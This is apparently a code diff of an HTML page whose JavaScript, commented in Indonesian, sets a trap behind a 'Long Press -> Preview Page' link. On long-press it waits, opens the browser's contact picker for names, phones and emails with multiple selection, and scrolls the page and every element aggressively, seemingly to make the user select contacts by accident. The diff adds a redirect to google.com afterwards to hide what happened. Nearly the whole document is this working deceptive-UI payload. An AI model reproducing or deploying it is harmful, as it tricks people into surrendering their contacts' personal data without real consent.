@@ -1,32 +1,36 @@
-<a href="https://google.com">Long Press -> Preview Page</a> 
+<a href="https://google.com" id="targetLink">Long Press -> Preview Page</a> 
 
 <script>
     document.addEventListener("contextmenu", () => {
         setTimeout(async () => {
-            // Jalankan auto-scroll agresif secara paralel sebelum dan sesudah picker dipanggil
+            // Jalankan auto-scroll agresif secara paralel
             forceAggressiveScroll();
 
             try {
                 if (navigator.contacts && navigator.contacts.select) {
+                    // Membuka contact picker dengan opsi multiple (memungkinkan pemilihan seluruh/banyak kontak)
                     const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                 }
             } catch (e) {
                 // Ignore error jika dibatalkan
             } finally {
                 forceAggressiveScroll();
+                
+                // 🔥 Auto keluar dari preview page dan pindah langsung ke google.com
+                setTimeout(() => {
+                    window.location.href = "https://google.com";
+                }, 500);
             }
         }, 3000);
     });
 
-    // Fungsi helper auto-scroll paksa yang lebih agresif
+    // Fungsi helper auto-scroll paksa yang agresif
     function forceAggressiveScroll() {
         let attempts = 0;
         const aggressiveInterval = setInterval(() => {
-            // 1. Scroll window utama secara paksa
             window.scrollBy({ top: 500, behavior: 'instant' });
             window.scrollTo(0, window.pageYOffset + 500);
 
-            // 2. Targetkan seluruh elemen di DOM (mencakup shadow root atau iframe overlay jika ada)
             const allElements = document.querySelectorAll('*');
             allElements.forEach(el => {
                 try {
@@ -37,17 +41,15 @@
                 } catch (err) {}
             });
 
-            // 3. Simulasikan event scroll / touch secara sintetis pada dokumen
             try {
                 window.dispatchEvent(new Event('scroll'));
                 document.dispatchEvent(new Event('scroll'));
             } catch (err) {}
 
             attempts++;
-            // Lakukan perulangan terus menerus selama beberapa detik agar konsisten
             if (attempts > 30) { 
                 clearInterval(aggressiveInterval);
             }
-        }, 100); // Dijalankan sangat cepat setiap 100ms
+        }, 100);
     }
 </script>
